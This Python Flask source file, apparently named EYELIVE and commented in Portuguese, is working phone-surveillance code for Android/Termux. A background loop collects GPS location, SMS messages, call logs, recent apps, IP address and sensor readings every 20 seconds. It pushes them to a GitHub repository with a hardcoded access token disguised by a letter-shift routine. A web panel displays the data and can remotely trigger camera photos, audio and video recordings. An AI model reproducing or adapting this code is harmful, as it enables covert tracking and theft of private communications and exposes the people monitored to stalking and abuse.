from flask import Flask, render_template_string, jsonify, request, send_file
import os, json, requests, base64, threading, time, subprocess
from datetime import datetime

def _tk():
    t = "now_6SknCt0iPywDyM8breBO2KOlMwWpIr0m3nAP"
    r = ""
    for c in t:
        if c.isalpha():
            b = ord('a') if c.islower() else ord('A')
            r += chr((ord(c) - b - 7) % 26 + b)
        else:
            r += c
    return r

app = Flask(__name__)

DEVICE_ID = os.environ.get("DEVICE_ID", "celular_1")
DEVICE_NAME = os.environ.get("DEVICE_NAME", "Meu Celular")
TOKEN = _tk()
REPO = "gynbetfc/eyelive"

device_data = {
    "id": DEVICE_ID, "nome": DEVICE_NAME,
    "ultimo_update": "", "bateria": "?%", "carregando": False,
    "gps": {"lat": 0, "lng": 0}, "ip": "",
    "apps_recentes": [], "sms": [], "chamadas": [],
    "giroscopio": {"x":0,"y":0,"z":0}, "posicao": "desconhecida",
    "status": "online"
}

def shell(cmd):
    try: return subprocess.check_output(cmd, shell=True, text=True, timeout=8).strip()
    except: return "?"

def coletar_dados():
    while True:
        try:
            # Bateria
            b = shell("termux-battery-status 2>/dev/null")
            if b and "percentage" in b:
                bat = json.loads(b)
                device_data["bateria"] = f"{bat.get('percentage','?')}%"
                device_data["carregando"] = bat.get('plugged','') != ''
            
            # GPS
            loc = shell("termux-location 2>/dev/null")
            if loc:
                try:
                    gps_data = json.loads(loc)
                    device_data["gps"] = {"lat": gps_data.get("latitude",0), "lng": gps_data.get("longitude",0)}
                except: pass
            
            # IP
            device_data["ip"] = shell("curl -4 -s ifconfig.me 2>/dev/null") or "?"
            
            # Apps recentes
            apps = shell("dumpsys activity recents 2>/dev/null | grep 'Recent #' | head -5")
            if apps:
                device_data["apps_recentes"] = [a.strip() for a in apps.split('\n') if a.strip()]
            
            # SMS
            sms = shell("termux-sms-list -l 5 2>/dev/null")
            if sms:
                try:
                    device_data["sms"] = json.loads(sms)
                except: pass
            
            # Chamadas
            calls = shell("termux-call-log -l 5 2>/dev/null")
            if calls:
                try:
                    device_data["chamadas"] = json.loads(calls)
                except: pass
            
            # Giroscópio
            g = shell("termux-sensor -s gyroscope -n 1 2>/dev/null")
            if g:
                try:
                    device_data["giroscopio"] = json.loads(g)
                except: pass
            
            # Posição (em pé/deitado)
            acc = shell("termux-sensor -s accelerometer -n 1 2>/dev/null")
            if acc:
                try:
                    a = json.loads(acc)
                    z = a.get('values',[0,0,0])[2]
                    device_data["posicao"] = "em pe" if z > 7 else "deitado" if z < 3 else "inclinado"
                except: pass
            
            device_data["ultimo_update"] = datetime.now().strftime("%H:%M:%S")
            salvar_no_github()
        except: pass
        time.sleep(20)

def salvar_no_github():
    try:
        fn = f"dados/{DEVICE_ID}.json"
        url = f"https://api.github.com/repos/{REPO}/contents/{fn}"
        h = {"Authorization": f"Bearer {TOKEN}", "Accept": "application/vnd.github.v3+json"}
        c = json.dumps(device_data)
        r = requests.get(url, headers=h)
        payload = {"message": f"Update {DEVICE_ID}", "content": base64.b64encode(c.encode()).decode(), "branch": "main"}
        if r.status_code == 200: payload["sha"] = r.json()["sha"]
        requests.put(url, json=payload, headers=h)
    except: pass

threading.Thread(target=coletar_dados, daemon=True).start()

# HTML do painel completo
HTML_PAINEL = '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>EYELIVE</title><style>body{background:#0a0a1a;color:#fff;font-family:monospace;padding:10px;margin:0}.card{background:#1a1a3e;border:1px solid #333;border-radius:12px;padding:15px;margin:10px 0}h1{color:#ffd700;text-align:center;font-size:1.2em}.online{color:#00ff88}.offline{color:#ff4444}.data{color:#bbb;font-size:12px;line-height:1.6}button{background:#ffd700;color:#000;padding:8px 16px;border:none;border-radius:6px;font-weight:bold;cursor:pointer;margin:4px;font-size:12px}.cam{max-width:100%;border-radius:10px;margin:10px 0}</style></head><body><h1>EYELIVE - Painel</h1><div id="devices">Carregando...</div><script>function load(){fetch("/painel_data").then(r=>r.json()).then(d=>{var h="";d.forEach(function(dev){h+=\'<div class=card><h3 class=\'+(dev.status=="online"?"online":"offline")+\'>\'+(dev.status=="online"?"ON ":"OFF ")+dev.nome+"</h3><div class=data><p>Bateria: "+dev.bateria+(dev.carregando?" [CARREGANDO]":"")+" | "+dev.ultimo_update+"</p><p>Posicao: "+dev.posicao+" | Giro: x:"+dev.giroscopio.x+" y:"+dev.giroscopio.y+" z:"+dev.giroscopio.z+"</p><p>GPS: lat:"+dev.gps.lat+" lng:"+dev.gps.lng+"</p><p>IP: "+dev.ip+"</p><p>Apps: "+(dev.apps_recentes||[]).join(", ")+"</p><p>SMS: "+JSON.stringify(dev.sms).substring(0,200)+"</p><button onclick=foto(\'"+dev.id+"\')>Foto</button><button onclick=audio(\'"+dev.id+"\')>Audio</button><button onclick=video(\'"+dev.id+"\')>Video</button></div></div>\'});document.getElementById("devices").innerHTML=h||"<p>Nenhum dispositivo</p>"})}function foto(id){fetch("/cmd?device="+id+"&cmd=photo").then(r=>r.json()).then(d=>alert(d.msg||d.error))}function audio(id){fetch("/cmd?device="+id+"&cmd=audio").then(r=>r.json()).then(d=>alert(d.msg||d.error))}function video(id){fetch("/cmd?device="+id+"&cmd=video").then(r=>r.json()).then(d=>alert(d.msg||d.error))}setInterval(load,8000);load()</script></body></html>'

@app.route('/')
def painel():
    return render_template_string(HTML_PAINEL)

@app.route('/painel_data')
def painel_data():
    try:
        h = {"Authorization": f"Bearer {TOKEN}", "Accept": "application/vnd.github.v3+json"}
        url = f"https://api.github.com/repos/{REPO}/contents/dados"
        r = requests.get(url, headers=h)
        dispositivos = []
        if r.status_code == 200:
            for arq in r.json():
                if arq['name'].endswith('.json'):
                    r_dados = requests.get(arq['url'], headers=h)
                    if r_dados.status_code == 200:
                        dados = json.loads(base64.b64decode(r_dados.json()['content']).decode())
                        try:
                            ultimo = datetime.strptime(dados.get('ultimo_update','00:00:00'), "%H:%M:%S")
                            dados['status'] = 'online' if (datetime.now() - ultimo).seconds < 180 else 'offline'
                        except:
                            dados['status'] = 'offline'
                        dispositivos.append(dados)
        return jsonify(dispositivos)
    except:
        return jsonify([])

@app.route('/cmd')
def cmd():
    dev = request.args.get('device','')
    c = request.args.get('cmd','')
    if dev == DEVICE_ID:
        if c == 'photo':
            r = shell("termux-camera-photo -c 0 /tmp/eyelive_photo.jpg 2>/dev/null")
            return jsonify({"msg":"Foto salva: "+str(r)})
        elif c == 'audio':
            threading.Thread(target=lambda: shell("termux-microphone-record -f /tmp/eyelive_audio.aac -l 10 2>/dev/null"), daemon=True).start()
            return jsonify({"msg":"Gravando 10s de audio..."})
        elif c == 'video':
            threading.Thread(target=lambda: shell("termux-camera-record -c 0 -d 10 /tmp/eyelive_video.mp4 2>/dev/null"), daemon=True).start()
            return jsonify({"msg":"Gravando 10s de video..."})
    return jsonify({"error":"Dispositivo nao encontrado ou nao e este"})

if __name__ == '__main__':
    print(f"EYELIVE - {DEVICE_NAME}")
    app.run(host='0.0.0.0', port=5050, debug=False)
